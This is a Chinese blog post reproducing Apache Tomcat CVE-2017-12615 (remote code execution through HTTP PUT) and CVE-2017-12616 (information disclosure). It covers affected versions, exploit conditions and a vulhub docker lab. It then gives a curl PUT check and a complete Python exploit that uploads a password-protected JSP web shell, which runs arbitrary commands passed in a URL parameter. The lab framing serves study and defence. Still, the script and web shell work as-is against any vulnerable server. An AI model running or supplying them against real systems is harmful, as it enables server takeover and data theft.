# CVE-2017-12615 漏洞复现附 EXP - _Deen - 博客园

> 原文：[`www.cnblogs.com/deen-/p/7566024.html`](https://www.cnblogs.com/deen-/p/7566024.html)

# CVE-2017-12615 复现

## 0x00 漏洞介绍

**漏洞编号**:

CVE-2017-12615

CVE-2017-12616

**漏洞名称**:

CVE-2017-12615-远程代码执行漏洞

CVE-2017-12616-信息泄露漏洞

**官方评级**:

高危

**漏洞描述**:

CVE-2017-12616：信息泄露漏洞

当 Tomcat 中启用了 VirtualDirContext 时，攻击者将能通过发送精心构造的恶意请求，绕过设置的相关安全限制，或是获取到由 VirtualDirContext 提供支持资源服务的 JSP 源代码，从而造成代码信息泄露。

**CVE-2017-12615：远程代码执行漏洞**

当 Tomcat 运行在 Windows 操作系统时，且启用了 HTTP PUT 请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP 文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。

通过以上两个漏洞可在用户服务器上执行任意代码，从而导致数据泄露或获取服务器权限，存在高安全风险。

**漏洞利用条件和方式**:

CVE-2017-12615 漏洞利用需要在 Windows 环境，且需要将 readonly 初始化参数由默认值设置为 false，经过实际测试，Tomcat 7.x 版本内 web.xml 配置文件内默认配置无 readonly 参数，需要手工添加，默认配置条件下不受此漏洞影响。
CVE-2017-12616 漏洞需要在 server.xml 文件配置 VirtualDirContext 参数，经过实际测试，Tomcat 7.x 版本内默认配置无 VirtualDirContext 参数，需要手工添加，默认配置条件下不受此漏洞影响。
漏洞影响范围:

CVE-2017-12616 影响范围：Apache Tomcat 7.0.0 - 7.0.80
CVE-2017-12615 影响范围： Apache Tomcat 7.0.0 - 7.0.79

## 0x01 环境搭建

使用 docker 搭建漏洞环境

github 地址：
[`github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615`](https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615)

## 0x02 漏洞验证

这里我直接搭建在本地 80 端口上，linux 系统下使用 curl 直接验证漏洞。

执行命令
`curl -XPUT 127.0.0.1/2.jsp/ --data "test"`

![](img/53c20487ab7a73105a8e90b95fa89999.png)

## 漏洞验证脚本

```
import requests
import sys
import time

'''
Usage:
	python CVE-2017-12615.py http://127.0.0.1

	shell: http://127.0.0.1/201712615.jsp?pwd=fff&cmd=whoami

'''

def attack(url):
	user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
	headers={"User-Agent":user_agent}
	data="""<%
    if("fff".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>"""
	try:
		requests.put(url, headers=headers, data=data)

		time.sleep(2)

		verify_response = requests.get(url[:-1], headers=headers)

		if verify_response.status_code == 200:
			print 'success!'
		else :
			print verify_response.status_code

	except :
		"error"

if __name__ == '__main__':
	target_url = sys.argv[1] + '/201712615.jsp/'

	attack(target_url)
	print 'shell: ' + target_url[:-1] 
```